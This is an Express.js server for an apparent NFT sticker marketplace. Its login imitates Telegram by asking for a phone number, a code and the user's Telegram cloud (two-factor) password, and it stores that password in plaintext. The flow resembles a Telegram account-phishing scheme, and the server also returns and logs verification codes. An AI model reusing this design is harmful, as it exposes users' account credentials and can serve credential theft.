import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';

dotenv.config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 3,
    name: "Diamond Premium",
    description: "Роскошный бриллиант",
    imageUrl: "https://via.placeholder.com/300x300/B9F2FF/000000?text=💎",
    price: 2.99,
    category: "premium",
    isAvailable: true
  }
];

// In-memory storage for users and sessions
let users = [];
let phoneVerificationCodes = new Map(); // phone -> {code, expiresAt}
let userSessions = new Map(); // sessionId -> userData

// Generate random verification code
function generateVerificationCode() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

// Routes
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// API Routes
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 1: Request phone number and send verification code
app.post('/api/auth/request-code', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ success: false, error: 'Phone number is required' });
    }

    // Validate phone format (simple validation)
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    if (!phoneRegex.test(phone)) {
      return res.status(400).json({ success: false, error: 'Invalid phone number format' });
    }

    // Generate verification code
    const verificationCode = generateVerificationCode();
    const expiresAt = Date.now() + 10 * 60 * 1000; // 10 minutes
    
    // Store verification code
    phoneVerificationCodes.set(phone, {
      code: verificationCode,
      expiresAt: expiresAt,
      attempts: 0
    });

    // In production: Send SMS via Telegram API or SMS service
    // For demo, we'll just return the code
    console.log(`📱 Verification code for ${phone}: ${verificationCode}`);
    
    res.json({
      success: true,
      message: 'Verification code sent to your Telegram account',
      code: verificationCode, // Remove this in production!
      step: 'verify_code'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 2: Verify code and request cloud password
app.post('/api/auth/verify-code', async (req, res) => {
  try {
    const { phone, code, cloudPassword } = req.body;
    
    if (!phone || !code) {
      return res.status(400).json({ success: false, error: 'Phone and code are required' });
    }

    // Check if verification code exists and is valid
    const verificationData = phoneVerificationCodes.get(phone);
    if (!verificationData) {
      return res.status(400).json({ success: false, error: 'Verification code not found or expired' });
    }

    // Check if code expired
    if (Date.now() > verificationData.expiresAt) {
      phoneVerificationCodes.delete(phone);
      return res.status(400).json({ success: false, error: 'Verification code expired' });
    }

    // Check attempts
    if (verificationData.attempts >= 3) {
      phoneVerificationCodes.delete(phone);
      return res.status(400).json({ success: false, error: 'Too many attempts' });
    }

    // Verify code
    if (verificationData.code !== code) {
      verificationData.attempts++;
      phoneVerificationCodes.set(phone, verificationData);
      return res.status(400).json({ 
        success: false, 
        error: `Invalid code. ${3 - verificationData.attempts} attempts remaining` 
      });
    }

    // Code is correct - clear verification data
    phoneVerificationCodes.delete(phone);

    // Find or create user
    let user = users.find(u => u.phone === phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: phone,
        telegramId: Math.floor(Math.random() * 1000000), // Mock Telegram ID
        isVerified: true,
        createdAt: new Date(),
        cloudPassword: cloudPassword || null
      };
      users.push(user);
    } else {
      // Update cloud password if provided
      if (cloudPassword) {
        user.cloudPassword = cloudPassword;
      }
      user.isVerified = true;
    }

    // Create session
    const sessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(sessionId, {
      userId: user.id,
      phone: user.phone,
      expiresAt: Date.now() + 24 * 60 * 60 * 1000 // 24 hours
    });

    res.json({
      success: true,
      message: isNewUser ? 'Account created successfully' : 'Login successful',
      user: {
        id: user.id,
        phone: user.phone,
        isVerified: user.isVerified,
        hasCloudPassword: !!user.cloudPassword
      },
      sessionId: sessionId,
      step: 'complete'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 3: Verify cloud password (if user has one)
app.post('/api/auth/verify-cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId || !cloudPassword) {
      return res.status(400).json({ success: false, error: 'Session ID and cloud password are required' });
    }

    // Verify session
    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ success: false, error: 'Invalid session' });
    }

    // Find user
    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    // Verify cloud password
    if (user.cloudPassword !== cloudPassword) {
      return res.status(401).json({ success: false, error: 'Invalid cloud password' });
    }

    res.json({
      success: true,
      message: 'Cloud password verified successfully'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Verify session middleware
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ success: false, error: 'Session ID is required' });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ success: false, error: 'Invalid session' });
    }

    // Check if session expired
    if (Date.now() > session.expiresAt) {
      userSessions.delete(sessionId);
      return res.status(401).json({ success: false, error: 'Session expired' });
    }

    // Find user
    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        isVerified: user.isVerified,
        hasCloudPassword: !!user.cloudPassword
      }
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV}`);
  console.log(`🎮 Health check: http://localhost:${PORT}/health`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
  console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
  
  if (process.env.TELEGRAM_BOT_USERNAME) {
    console.log(`🤖 Bot: https://t.me/${process.env.TELEGRAM_BOT_USERNAME}`);
  }
});
